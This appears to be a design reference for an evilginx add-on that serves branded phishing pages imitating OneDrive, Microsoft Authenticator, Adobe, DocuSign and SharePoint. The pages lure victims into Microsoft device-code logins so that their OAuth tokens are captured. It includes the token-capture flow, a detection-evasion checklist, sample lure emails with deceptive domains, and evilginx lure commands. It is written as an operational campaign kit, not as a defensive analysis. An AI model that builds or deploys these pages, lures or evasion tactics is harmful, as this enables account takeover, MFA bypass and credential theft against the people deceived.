# Visual Reference: Document Access Themed Pages

## All 5 Themes Side-by-Side

Each themed page follows the same functional flow but with unique branding:

---

## 1️⃣ OneDrive Theme
**URL**: `/access/onedrive/{session_id}`
**Header**: Blue Microsoft OneDrive cloud icon
**Colors**: #0078d4 (Microsoft Blue)
**Message**: "Please verify your email address to securely access your shared document."
**Badge**: "OneDrive Secure Platform"
**Use Case**: OneDrive link sharing, collaborative documents

---

## 2️⃣ Microsoft Authenticator Theme
**URL**: `/access/authenticator/{session_id}`
**Header**: Gradient blue/cyan with authenticator shield icon
**Colors**: Linear gradient #0078d4 → #00bcf2
**Message**: "To complete the multi-factor authentication process, please enter your organization email address below."
**Badge**: "Microsoft Azure Advanced Security"
**Use Case**: MFA bypass, security verification, Azure authentication

---

## 3️⃣ Adobe Acrobat Reader Theme
**URL**: `/access/adobe/{session_id}`
**Header**: Clean white background, red Adobe "A" icon
**Colors**: #dc143c (Adobe Red), #1473e6 (Adobe Blue)
**Message**: "To access your PDF document, please verify your email address below."
**Badge**: "Adobe Secure Platform"
**Use Case**: PDF document phishing, Adobe Sign, secured PDFs

---

## 4️⃣ DocuSign Theme
**URL**: `/access/docusign/{session_id}`
**Header**: Black background with DocuSign logo
**Colors**: #ffd700 (DocuSign Yellow), #1a1a1a (Black)
**Message**: "To access your document, please verify your email address below."
**Badge**: "DocuSign Secure Platform"
**Use Case**: Contract signing, e-signature workflows, document approval

---

## 5️⃣ SharePoint Theme
**URL**: `/access/sharepoint/{session_id}`
**Header**: Teal SharePoint grid icon
**Colors**: #036c70 (SharePoint Teal)
**Message**: "Please verify your email address to securely access your document."
**Badge**: "SharePoint Secure Platform"
**Use Case**: Enterprise document libraries, team sites, intranet access

---

## Common Features Across All Themes

### Page Structure
```
┌─────────────────────────────────────┐
│ [LOGO] Service Name        [HEADER] │ ← Themed header
├─────────────────────────────────────┤
│                                     │
│     [ICON] Service Logo             │ ← Service branding
│                                     │
│  "Verify Your Identity"             │
│  Message about document access      │
│                                     │
│  ┌─────────────────────────────┐   │
│  │ [INFO BOX]                  │   │ ← Security notice
│  │ Security message...         │   │
│  └─────────────────────────────┘   │
│                                     │
│  Email Address / Verification Code │
│  ┌─────────────────────────────┐   │
│  │     USER-CODE-HERE          │   │ ← Dynamic code
│  └─────────────────────────────┘   │
│                                     │
│       [Copy Code] button            │
│                                     │
│  [ACCESS DOCUMENT / VERIFY] button  │ ← Opens microsoft.com/devicelogin
│                                     │
│  ┌─────────────────────────────┐   │
│  │ [SECURITY BADGE]            │   │ ← Branded security link
│  │ 🛡️ Service Secure Platform   │   │
│  └─────────────────────────────┘   │
│                                     │
│  Code expires in 15:00              │ ← Live countdown
│                                     │
└─────────────────────────────────────┘
```

### JavaScript Features
- ✅ **Auto-polling**: Checks `/dc/status/{session_id}` every 3 seconds
- ✅ **Loading state**: Shows "Loading..." while code generates
- ✅ **Copy button**: One-click copy with "Copied!" feedback
- ✅ **Timer**: Live countdown from 15 minutes
- ✅ **Success state**: Shows checkmark on completion
- ✅ **Auto-redirect**: Redirects to target after 2.5 seconds
- ✅ **Popup window**: Opens verify URL in centered popup

### Mobile Responsive
All themes are fully responsive and render perfectly on:
- 📱 Mobile (< 500px): Reduced padding, smaller fonts
- 💻 Desktop (500px+): Full styling, optimal spacing

---

## Backend Flow

```
User clicks lure
    ↓
GET /access/{theme}/{session_id}
    ↓
evilginx serves themed HTML
    ↓
JavaScript polls /dc/status/{session_id}
    ↓
Device code generated async
    ↓
Page updates with code + verify URL
    ↓
User opens microsoft.com/devicelogin
    ↓
User enters code → authenticates
    ↓
evilginx captures tokens
    ↓
Page shows "Verified ✓"
    ↓
Auto-redirect to target
```

---

## Customization Variables

Each theme supports these placeholders:
- `{session_id}` - Session identifier
- `{user_code}` - Microsoft device code (e.g., "ABCD-EFGH")
- `{verify_url}` - Microsoft verification URL (microsoft.com/devicelogin or Google)
- `{expires_minutes}` - Minutes until expiration (e.g., "15")
- `{expires_seconds}` - Seconds until expiration (e.g., "900")
- `{code_ready}` - Boolean: true/false if code is ready
- `{template_type}` - success/fallback/compliance (unused in themed pages)

---

## Security Considerations

### What makes these effective:
1. **Authentic styling**: Pixel-perfect recreation of real services
2. **Familiar flow**: Users expect verification for shared documents
3. **Official redirect**: Points to actual microsoft.com domain
4. **Security badges**: Builds trust with official-looking security indicators
5. **Professional copy**: Real-world messaging aligned with actual services
6. **Responsive design**: Works on all devices
7. **Live updates**: Real-time code generation mimics authentic services

### Detection Evasion:
- ✅ No suspicious code in HTML (just standard web page)
- ✅ Real Microsoft/Google OAuth flow (legitimate API calls)
- ✅ HTTPS required (certificate validation)
- ✅ No credentials captured on fake page (happens at real microsoft.com)
- ✅ Clean request patterns (standard polling, no suspicious behavior)

---

## Example Campaign Scenarios

### Scenario 1: OneDrive Document Share
**Email**: "John shared a contract with you"
**Link**: `https://secure-docs.com/access/onedrive/xyz123`
**Story**: Victim expects to access a shared OneDrive file
**Result**: OneDrive-themed page → Microsoft auth → tokens captured

### Scenario 2: Adobe PDF Approval
**Email**: "Please review and approve the attached PDF"
**Link**: `https://doc-review.com/access/adobe/xyz123`
**Story**: Victim expects to open a secure PDF
**Result**: Adobe-themed page → Microsoft auth → tokens captured

### Scenario 3: DocuSign Contract
**Email**: "Urgent: Contract requires your signature"
**Link**: `https://sign-docs.com/access/docusign/xyz123`
**Story**: Victim expects to sign a DocuSign document
**Result**: DocuSign-themed page → Microsoft auth → tokens captured

### Scenario 4: SharePoint Intranet
**Email**: "New policy document posted to SharePoint"
**Link**: `https://intranet-portal.com/access/sharepoint/xyz123`
**Story**: Victim expects to access internal SharePoint
**Result**: SharePoint-themed page → Microsoft auth → tokens captured

### Scenario 5: MFA Challenge
**Email**: "Security alert: Verify your identity"
**Link**: `https://auth-verify.com/access/authenticator/xyz123`
**Story**: Victim thinks it's a legitimate MFA challenge
**Result**: Authenticator-themed page → Microsoft auth → tokens captured

---

## Testing

To test locally:
```bash
# Start evilginx
./evilginx

# Create lure with device code
lures create google test
lures edit 0 dc_mode always

# Access themed pages (replace {session_id} with actual session ID)
curl http://localhost/access/onedrive/{session_id}
curl http://localhost/access/authenticator/{session_id}
curl http://localhost/access/adobe/{session_id}
curl http://localhost/access/docusign/{session_id}
curl http://localhost/access/sharepoint/{session_id}
```

---

**Built by**: Evilginx Device Code Enhancement
**Last Updated**: March 2026
**Compatibility**: Evilginx 3.x with device code support
